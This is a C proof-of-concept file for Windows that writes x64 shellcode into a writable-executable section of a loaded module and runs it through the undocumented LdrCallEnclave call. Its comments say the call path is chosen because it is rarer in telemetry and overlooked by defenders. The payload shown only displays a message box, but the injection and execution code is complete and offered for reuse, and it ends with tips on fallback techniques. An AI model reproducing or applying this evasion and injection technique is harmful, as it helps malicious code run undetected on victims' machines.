#include <windows.h>
#include <stdio.h>
#include <psapi.h>

#pragma comment(lib, "psapi.lib")
/*
this PoC abuses LdrCallEnclave—an API that’s meant to call a function inside a secure enclave
instead of jumping to a secure enclave, we jump to an arbitrary function pointer in normal (VTL0) user memory
because of how the Windows user-mode loader’s enclave call shim is implemented, passing a VTL0 address can still result in that address being executed, so our buffer ends up running like any other callback target
this one is rarer in telemetry and often unhooked and overlooked by defenders, but it is not special kernel magic, we still are killed by the watchers of watchers

*/
// Shellcode for MessageBoxA and ExitProcess (x64)
char shellcode[] = "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
                        "\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
                        "\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
                        "\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
                        "\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
                        "\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
                        "\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
                        "\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
                        "\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
                        "\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
                        "\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
                        "\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
                        "\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
                        "\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
                        "\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
                        "\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
                        "\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
                        "\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
                        "\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
                        "\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
                        "\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
                        "\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
                        "\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
                        "\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
                        "\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
                        "\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
                        "\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
                        "\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
                        "\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

EXTERN_C NTSYSAPI NTSTATUS NTAPI LdrCallEnclave(
    _In_ PENCLAVE_ROUTINE Routine,
    _In_ ULONG Flags,
    _Inout_ PVOID* RoutineParamReturn);

int main() {
    HMODULE hMods[1024];
    HANDLE hProcess = GetCurrentProcess();
    DWORD cbNeeded;
    PVOID pTargetRWX = NULL;
    SIZE_T shellcodeSize = sizeof(shellcode);
    // find rwx regions in loaded modules
    if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
        for (DWORD i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
            CHAR szModName[MAX_PATH];
            if (GetModuleFileNameExA(hProcess, hMods[i], szModName, sizeof(szModName))) {
                HANDLE hFile = CreateFileA(szModName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
                if (hFile == INVALID_HANDLE_VALUE) continue;

                HANDLE hFileMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
                if (!hFileMapping) {
                    CloseHandle(hFile);
                    continue;
                }

                LPVOID pFileBase = MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, 0);
                if (!pFileBase) {
                    CloseHandle(hFileMapping);
                    CloseHandle(hFile);
                    continue;
                }

                PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)pFileBase;
                if (pDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
                    UnmapViewOfFile(pFileBase);
                    CloseHandle(hFileMapping);
                    CloseHandle(hFile);
                    continue;
                }

                PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)((LPBYTE)pFileBase + pDosHdr->e_lfanew);
                if (pNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
                    UnmapViewOfFile(pFileBase);
                    CloseHandle(hFileMapping);
                    CloseHandle(hFile);
                    continue;
                }

                PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHdrs);
                for (int j = 0; j < pNtHdrs->FileHeader.NumberOfSections; j++, pSection++) {
                    if ((pSection->Characteristics & IMAGE_SCN_MEM_READ) &&
                        (pSection->Characteristics & IMAGE_SCN_MEM_WRITE) &&
                        (pSection->Characteristics & IMAGE_SCN_MEM_EXECUTE)) {

                        // base address of found rwx section
                        PVOID pSectionBase = (LPBYTE)hMods[i] + pSection->VirtualAddress;

                        // is it large enough for our shellcode?
                        if (pSection->Misc.VirtualSize >= shellcodeSize) {
                            pTargetRWX = pSectionBase;
                            printf("[+] Found suitable RWX section: %s in %s at 0x%p\n",
                                (char*)pSection->Name, szModName, pSectionBase);
                            break; // found it
                        }
                    }
                }

                UnmapViewOfFile(pFileBase);
                CloseHandle(hFileMapping);
                CloseHandle(hFile);

                if (pTargetRWX) break;
            }
        }
    }

    if (pTargetRWX) {
        printf("[+] injecting shellcode into the RWX memory page we found at 0x%p\n", pTargetRWX);
        memcpy(pTargetRWX, shellcode, shellcodeSize);

        // instruction cache flush to ensure stability on multi-core CPU
        FlushInstructionCache(GetCurrentProcess(), pTargetRWX, shellcodeSize);

        printf("[+] executing shellcode via LdrCallEnclave... gooo!\n");
        LPVOID dummyParam = NULL;
        LdrCallEnclave((PENCLAVE_ROUTINE)pTargetRWX, 0, &dummyParam);
    } else {
        printf("[-] no rwx sections found\n");
        // Fallback could involve other techniques, or you could just use VirtualAlloc with RWX or RW - RX flip :]
        // You end up here if we fail to find suitable RWX memory regions to inject our shellcode into, no stress. Just try something else i guess
    }

    return 0;
}
